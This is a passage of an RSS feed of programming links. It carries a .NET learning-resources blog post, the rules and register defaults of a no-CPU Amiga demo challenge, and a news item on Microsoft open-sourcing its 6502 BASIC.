07 Sep 2025 21:35:18 +0530</pubDate></item><item><link>https://mijailovic.net/2025/09/07/dotnet/</link><title>How to (actually) become an expert in .NET (mijailovic.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</guid><comments>https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 12 min | <a href='https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/'>Post permalink</a></p></section><section class='preview-image'><img src='https://mijailovic.net/assets/img/2025-09-07-dotnet.png' /></section><section class='parsed-content'><div><article><div><p>The influencers want you to think that you must learn a gazillion different technologies to become a successful .NET developer. These days, the internet is full of .NET &ldquo;roadmaps&rdquo; that include everything but the kitchen sink: Azure, AWS, Redis, Docker, Postgres, GraphQL, gRPC, Dapper, ELK stack, CQRS, you name it.</p><p>There are several problems with this trend. One is that it generates fear and anxiety that it&rsquo;s impossible to become a good developer, because the list of things you &ldquo;must&rdquo; know is growing by the day. It might also lead you to focus on the wrong things and waste the time you could spend <em>actually</em> improving your .NET skills. The other problem is that these claims are objectively wrong. I&rsquo;ve been using .NET for over 15 years, 6 of which I&rsquo;ve spent working for Microsoft, where I&rsquo;m currently a principal engineer. If I were to be judged by what influencers call minimal .NET knowledge, I wouldn&rsquo;t even qualify as a junior developer.</p><p>I&rsquo;m not being funny or anything, but shouldn&rsquo;t you learn Redis only if you, like, work with Redis? You don&rsquo;t have to learn GraphQL to be a good .NET developer, but you should absolutely learn how memory management works. Kafka and RabbitMQ are optional&mdash;knowing how async/await works is essential. Don&rsquo;t get me wrong: these are all cool technologies and it&rsquo;s great to be familiar with them. But most technologies can be easily learned when there is a real need. What truly matters is mastering the knowledge of .NET itself, and that&rsquo;s what this post is all about.</p><h2>How to read this guide</h2><p>I&rsquo;m going to share with you the list of resources that will help you to become a great .NET developer. Even though I tried to summarize only the essentials, it&rsquo;s still a lot of information. Mastering every area I&rsquo;m gonna talk about will take you months or even years, so don&rsquo;t get discouraged early on. It&rsquo;s impossible to learn everything immediately&mdash;what matters is expanding your expertise slowly, topic by topic.</p><p>You can learn the topics I presented in any order. For example, if your job requires you to write high-performance code, you could start your learning journey by focusing on the performance and tools sections. Or if you want to broaden your C# knowledge first, you could start with <em>C# learning resources</em>. If you are not sure, <em>Exploring .NET internals</em> is the best place to get started.</p><p>Before we start: if you are an absolute .NET beginner, this post is probably not for you. If you want to learn C#, I recommend watching the <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oULFjxrOagaERVAMbmG20Xe">C# for Beginners</a> YouTube video course first. Now let&rsquo;s get started.</p><h2>Books</h2><p>If you had asked me ten years ago what&rsquo;s the best way to learn .NET, I would have probably told you to read CLR via C#. Although it&rsquo;s still one of my favorite technical books ever, .NET has changed so much since the book came out that I can no longer recommend it as the most efficient way to master .NET. In fact, I think that the quality of technical books has been decreasing over the years, so there are fewer and fewer books that I would consider must-reads.</p><p>Having said that, if you like reading books, there are still some excellent ones out there! If I had to recommend only one .NET book, it would be <a href="https://www.ebooks.com/en-cz/book/210046474/framework-design-guidelines/krzysztof-cwalina/">Framework Design Guidelines</a>. Written by .NET architects, it&rsquo;s a collection of conventions and best practices for writing idiomatic .NET code. What elevates this book from the rest is that it&rsquo;s full of comments and annotations from .NET legends such as Jeffrey Richter, Joe Duffy, Rico Mariani, and Vance Morrison, in which they explain not only the best practices, but also the reasoning behind them.</p><p>Another book I loved is <a href="https://www.writinghighperf.net/">Writing High-Performance .NET Code</a>. When it came out in 2018, it was the most comprehensive guide to .NET performance. The only thing that&rsquo;s holding me back from giving it my seal of approval now is that I haven&rsquo;t re-read it since, so I&rsquo;m not sure if it still holds up today (my guess is that it&rsquo;s still relevant).</p><h2>Exploring .NET internals</h2><p>I think the key to becoming a .NET expert is learning how things work under the hood. Gaining a deep understanding of async/await, string interpolation, spans, and garbage collection will give you superpowers and help you stand out from the crowd. The .NET team regularly publishes deep dives on their blog (well, it&rsquo;s just Stephen Toub in most cases), and they are great, without exception. Here are the ones I consider the most important:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/how-async-await-really-works/">How Async/Await Really Works in C#</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/string-interpolation-in-c-10-and-net-6/">String Interpolation in C# 10 and .NET 6</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/configureawait-faq/">ConfigureAwait FAQ</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/an-introduction-to-system-threading-channels/">An Introduction to System.Threading.Channels</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/understanding-the-whys-whats-and-whens-of-valuetask/">Understanding the Whys, Whats, and Whens of ValueTask</a></li> <li><a href="https://learn.microsoft.com/en-us/archive/msdn-magazine/2018/january/csharp-all-about-span-exploring-a-new-net-mainstay">All About Span: Exploring a New .NET Mainstay</a></li> </ul><p>If you prefer watching videos, <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oX8eqDkSw4hH9cSehrGgdr1">Deep .NET</a> is hands down the best collection of .NET deep dives on the internet. These videos cover the same topics as the blog posts I mentioned and even more, so they are definitely worth your time.</p><h2>C# learning resources</h2><p>Assuming you already know the basics of C#, progressing further is fairly straightforward. Whether you want to learn about the new C# features or just fill the gaps in your knowledge, you should check out the following pages:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-14">What&rsquo;s new in C# 14</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/whats-new/dotnet-10/overview">What&rsquo;s new in .NET 10</a></li> </ul><p>These two articles describe the new features in the latest versions of C# and .NET, but I also recommend reading about all previous versions. Even if you are an experienced .NET developer, I think you will still learn something new.</p><h2>Staying up to date</h2><p>First of all, you don&rsquo;t need to know about every new runtime or language feature. You&rsquo;ll be perfectly fine even if you don&rsquo;t start using <code>readonly ref struct</code>, record types, or pattern matching right away. But I would still advise you to periodically check what&rsquo;s been going on in the .NET ecosystem. It&rsquo;s not necessary to do this on a weekly or even a monthly basis&mdash;doing this once a year should be more than enough.</p><p>Your main source of information should be the <a href="https://devblogs.microsoft.com/dotnet/">.NET blog</a> (other blogs often cherry-pick random pieces of information from official .NET posts). Not everything on the .NET blog is required reading, though. For me, the most illuminating posts are the ones that showcase the improvements in the latest .NET versions. My personal highlights are the following series:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">Performance Improvements in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/dotnet-9-networking-improvements/">.NET 9 Networking Improvements</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/system-text-json-in-dotnet-9/">What&rsquo;s new in System.Text.Json in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/file-io-improvements-in-dotnet-6/">File IO improvements in .NET 6</a></li> </ul><p>These are just the latest posts in the series&mdash;if you like them, I highly recommend reading the earlier posts in the series as well.</p><h2>Mastering the key libraries</h2><p>To be an effective .NET developer, it&rsquo;s more important to be proficient with the standard library than to be familiar with any specific external library. It&rsquo;s definitely worth learning the modern APIs for <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview">JSON serialization and deserialization</a>. Learning how to use the HttpClient correctly is also essential&mdash;it seems obvious, but it&rsquo;s surprisingly tricky to get right. Here are my recommended articles about writing reliable networking code and avoiding common pitfalls:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/networking/http/httpclient-guidelines">Guidelines for using HttpClient</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/extensions/httpclient-factory">IHttpClientFactory with .NET</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/resilience/http-resilience">Build resilient HTTP apps: Key development patterns</a></li> </ul><p>Outside the standard library, Newtonsoft.Json is still so widely used that it&rsquo;s very useful to at least know how to use it optimally <a href="https://www.newtonsoft.com/json/help/html/performance.htm">for performance</a>.</p><h2>Writing high-performance code</h2><p>Modern .NET is incredibly fast. In fact, I would say that high performance is one of its defining characteristics, so it pays off to understand how to take full advantage of the platform&rsquo;s high-performance features.</p><p>Stephen Toub&rsquo;s annual blog posts on <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">performance improvements in .NET</a> are among the most valuable resources for learning about .NET performance. Although they are published as blog posts, they really are books in disguise&mdash;the latest installment is more than 300 pages long. Unless you have unlimited free time, reading them end-to-end is next to impossible. My recommended way of consuming these posts is to scan through the topics and carefully read sections that pique your curiosity. What does that mean? If you are a compiler optimization geek, you might want to read sections about the latest JIT and PGO improvements. But if you are looking for practical knowledge you can apply immediately in your backend service, you could read sections about JSON and networking improvements.</p><p>Writing the fastest possible .NET code requires understanding how garbage collection works. The official documentation on <a href="https://learn.microsoft.com/en-us/dotnet/standard/garbage-collection/">garbage collection</a> is great: it&rsquo;s easy to read and very thorough. It will teach you how generations work, what is the large object heap, what are the differences between workstation and server garbage collection, and much more. But the definitive resource for mastering memory in .NET is the <a href="https://github.com/Maoni0/mem-doc/blob/master/doc/.NETMemoryPerformanceAnalysis.md">.NET Memory Performance Analysis</a> document written by Maoni Stephens, the .NET GC architect. It&rsquo;s the ultimate guide on how to approach memory performance analysis, and one of the best ways to deepen your understanding of how memory works in .NET.</p><p>Finally, it&rsquo;s important to learn how to measure performance correctly. <a href="https://benchmarkdotnet.org/">BenchmarkDotNet</a> is the undisputed king of .NET benchmarking and one of the few libraries everyone should be using. However, knowing how to use BenchmarkDotNet is just half of the story. Writing good benchmarks is not trivial and you can easily end up measuring the wrong thing. That&rsquo;s where the .NET team&rsquo;s <a href="https://github.com/dotnet/performance/blob/main/docs/microbenchmark-design-guidelines.md">Microbenchmark Design Guidelines</a> come into play. Think of this document as the missing BenchmarkDotNet manual&mdash;it goes beyond the syntax and teaches you how to design your benchmarks the right way. The <a href="https://github.com/dotnet/performance">.NET Performance</a> GitHub repository also contains all benchmarks for the .NET standard library. If you ever need inspiration when designing benchmarks, it&rsquo;s the best place to start.</p><p>I think everyone should have a decompiler in their toolbox. It&rsquo;s useful not only for reverse engineering, but also if you want to learn how seemingly simple statements like string interpolation work under the hood. The choice of decompiler is up to you&mdash;I personally prefer <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>.</p><p>One more indispensable tool is the <a href="https://source.dot.net/">.NET Source Browser</a>. I often use it to inspect how .NET classes are implemented and to find examples of good code design patterns. Even though the .NET source code is available in the <a href="https://github.com/dotnet/runtime">.NET Runtime</a> GitHub repository, the source browser makes navigation much easier.</p><p>.NET Framework&rsquo;s tooling was pretty bare-bones. In contrast, .NET Core comes with some fantastic <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/tools-overview">diagnostic tools</a>. You most likely won&rsquo;t use all of them in your day-to-day work, but in the right circumstances, they can be incredibly handy. At the very least, you should be aware of which tools exist. That way, if you ever need to collect a memory dump, you&rsquo;ll know you can use <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump">dotnet-dump</a>. Or if you need to debug runaway threads, <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-stack">dotnet-stack</a> can capture the stacks of all threads in a .NET process.</p><h2>Conclusion</h2><p>I hope this post was not too overwhelming! But my main message is simple: focus on having rock-solid fundamentals and you&rsquo;ll be golden. Hopefully, you also discovered some new and interesting learning resources. Let me know if I missed anything you consider essential!</p></div></article> </div></section>]]></description><pubDate>Sun, 07 Sep 2025 15:13:57 +0530</pubDate></item><item><link>https://github.com/askeksa/NoCpuChallenge</link><title>The No-CPU Amiga Demo Challenge (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</guid><comments>https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/00e4db5f825b16def79a43fd1c69a1386894629132ee3b573872491357d04977/askeksa/NoCpuChallenge' /></section><section class='parsed-content'><div><article><h2>The No-CPU Amiga Demo Challenge</h2><a href="https://github.com#the-no-cpu-amiga-demo-challenge"></a><p>This is an open challenge to create demos that run entirely on the Amiga custom chips without involving the CPU.</p><p>This repository contains the rules of the challenge and a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application for launching no-CPU demos. This is intended as a standard specification of the no-CPU platform for demo competitions.</p><p>There will be a dedicated no-CPU Amiga demo competition at <a href="https://gerp.nu/"><strong>Gerp 2026</strong></a>, January 23-25, 2026. In addition, this is an ongoing challenge &mdash; an invitation to explore a different kind of demo platform.</p><p>An <a href="https://www.pouet.net/prod.php?which=104753">invitation demo</a> &mdash; itself a no-CPU demo &mdash; was released at <strong>Evoke 2025</strong>. The full source code for the demo is available <a href="https://github.com/askeksa/NoCpuDemo">here</a>.</p><p>Whenever you release a no-CPU demo, you are encouraged to write a comment about it on the <a href="https://github.com/askeksa/NoCpuChallenge/issues/1">demo announcement issue</a>.</p><p>There's also a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/faq.md">FAQ</a>.</p><h2>Background</h2><a href="https://github.com#background"></a><p>The Amiga custom chips (affectionately named <strong>Alice</strong>, <strong>Lisa</strong> and <strong>Paula</strong> in the AGA version of the chipset) were remarkably powerful for their time, enabling the Amiga computers &mdash; with their modestly-powered CPUs &mdash; to perform graphical and musical feats that required heavy computation on most contemporary platforms.</p><p>This challenge aims to discover just how powerful these chips really are by exploring what they can do completely on their own, without the CPU even telling them what to do.</p><p>There have been several demo competitions in the past with a technical theme. Examples include <a href="https://sommarhack.se/2024/compo.php#themed1">Atari zero bitplane</a>, <a href="https://sommarhack.se/2025/compo.php#themed">Atari mixed-resolution</a>, <a href="https://csdb.dk/event/?id=3003">C64 only sprites</a> and <a href="https://csdb.dk/event/?id=3021">C64 border only</a>. This is a similar idea for the Amiga &mdash; no CPU, custom chips only.</p><h2>Technical details</h2><a href="https://github.com#technical-details"></a><p>A no-CPU demo takes the form of a raw memory image that specifies the initial contents of chip memory. Together with the initial state of the hardware registers (specified below) this memory image fully defines the demo.</p><p>The memory image is loaded into memory by a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application, which serves as the demo executable. You can use the runner as is or modify it to your liking, but in order to qualify as a no-CPU demo according to this challenge, your chip memory image has to work with the official runner (with the same behavior).</p><p>The maximum size of the chip memory image depends on the targeted Amiga chipset: 512k for OCS, 1MB for ECS (or OCS with ECS Agnus and 512k expansion, <a href="https://eab.abime.net/showthread.php?t=120351&amp;page=2">likely</a> the most common Amiga 500 configuration), and 2MB for AGA.</p><p>The audio filter is disabled. Since the filter is controlled via the CIA registers, which the copper does not have access to, the demo does not have the option of enabling the filter.</p><p>The initial hardware register contents are as follows. Registers with ECS/AGA specific bits are generally initialized to their OCS defaults. This makes it easier to make a demo targeting OCS without worrying about AGA compatibility (as long as you are not using incompatible features, such as the 7 bitplane trick).</p><markdown-accessiblity-table><table> <thead> <tr> <th>Register</th> <th>Address</th> <th>Value</th> <th>Comment</th> </tr> </thead> <tbody> <tr> <td>VPOSW</td> <td><code>$dff02a</code></td> <td><code>$8000</code></td> <td>Long frames</td> </tr> <tr> <td>COPCON</td> <td><code>$dff02e</code></td> <td><code>$0002</code></td> <td>Copper danger flag set</td> </tr> <tr> <td>COP1LC</td> <td><code>$dff080</code></td> <td><code>$000000</code></td> <td>Copper initially starts at address 0</td> </tr> <tr> <td>DMACON</td> <td><code>$dff096</code></td> <td><code>$87c0</code></td> <td>Bitplane, copper and blitter DMA enabled, sprite DMA disabled, Blitter Nasty set</td> </tr> <tr> <td>ADKCON</td> <td><code>$dff09e</code></td> <td><code>$xx00</code></td> <td>All modulation disabled</td> </tr> <tr> <td>BPLCON0</td> <td><code>$dff100</code></td> <td><code>$0200</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON1</td> <td><code>$dff102</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON2</td> <td><code>$dff104</code></td> <td><code>$0024</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON3</td> <td><code>$dff106</code></td> <td><code>$0c00</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON4</td> <td><code>$dff10c</code></td> <td><code>$0011</code></td> <td>OCS default</td> </tr> <tr> <td>COLOR00</td> <td><code>$dff180</code></td> <td><code>$000</code></td> <td>Black background</td> </tr> <tr> <td>BEAMCON0</td> <td><code>$dff1dc</code></td> <td><code>$0020</code></td> <td>PAL</td> </tr> <tr> <td>FMODE</td> <td><code>$dff1fc</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> </tbody> </table></markdown-accessiblity-table><p>The values of all other registers are undefined.</p><p>The demo can signal that it has ended by clearing the Blitter Nasty flag (i.e. by executing the copper instruction $0096,$0400). Depending on the hardware configuration, the runner may not actually be able to exit back to the OS, so the demo should still maintain a valid display.</p><h2>Feedback</h2><a href="https://github.com#feedback"></a><p>If you have questions or comments, you are welcome to <a href="https://github.com/askeksa/NoCpuChallenge/issues/new">open an issue</a>. I am particularly interested in feedback in these areas:</p><ul> <li>If there is something in the rules or the runner that you think puts undue limits on what no-CPU demos can do under this formalism.</li> <li>If you find a security hole in the runner sandbox, enabling a demo to reactivate the CPU.</li> </ul> </article></div></section>]]></description><pubDate>Sun, 07 Sep 2025 12:38:09 +0530</pubDate></item><item><link>https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html</link><title>Microsoft’s first-ever programming language was just open-sourced (pcworld.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</guid><comments>https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.pcworld.com/wp-content/uploads/2025/09/Commodore-64.jpg?quality=50&strip=all&w=1024' /></section><section class='parsed-content'><div><article><div><div><div><body><p>Did you know that, between 1976 and 1978, Microsoft developed its own version of the BASIC programming language? It was initially called Altair BASIC before becoming Microsoft BASIC, and it was designed for the 6502 (a microprocessor used in the Apple II, Atari 2600, VIC-20, Commodore 64, and Nintendo Entertainment System).</p><p>As of yesterday, Microsoft has released the version 1.1 source code of &ldquo;Microsoft BASIC for 6502 Microprocessor&rdquo; on <a href="https://go.skimresources.com?id=111346X1569483&amp;xs=1&amp;url=https://github.com/microsoft/BASIC-M6502&amp;xcust=2-1-2898698-1-0-0-0-0&amp;sref=https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html">GitHub</a>, which means you can freely view the assembly code and even download it if you want to.</p><p>Why did Microsoft publish this code? Because it has historical significance and was one of the pillars of modern software:</p><blockquote><p>This source code represents the foundation upon which the modern software industry was built. The techniques, patterns, and business models pioneered in this BASIC interpreter directly influenced:</p><ul> <li>The development of MS-DOS and subsequent Microsoft operating systems</li> <li>The standardization of programming language implementations</li> <li>The establishment of software licensing as a business model</li> <li>The democratization of computer programming</li> </ul> </blockquote><p>Microsoft&rsquo;s version of BASIC was one of the first programming languages that the general public came into contact with, making it an important milestone in computer history. While Microsoft BASIC is no longer used in earnest, its spirit lives on with Visual Basic .NET.</p></body></div><p>This article originally appeared on our sister publication <a href="https://www.pcforalla.se">PC f&ouml;r Alla</a> and was translated and localized from Swedish.</p><div><h3> <a href="https://www.pcworld.com/author/mikael_markander"> Author: Mikael Markander</a>, Contributor, PCWorld </h3><div><p>Mikael writes news across all our consumer tech categories. He has previously worked with Macworld, but today mainly writes for our sister sites PC f&ouml;r Alla and M3. Mikael has a firm grasp on which gadgets are released, and what is happening with the streaming services and the latest AI tools.</p></div></div></div></div></article> </div><div class="gallery"><p><img src="https://www.pcworld.com/wp-content/uploads/2025/09/1380047922-4.jpg?quality=50&amp;strip=all&amp;w=150&amp;h=150&amp;crop=1"></p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 20:41:56 +0530</pubDate></item></channel></rss>
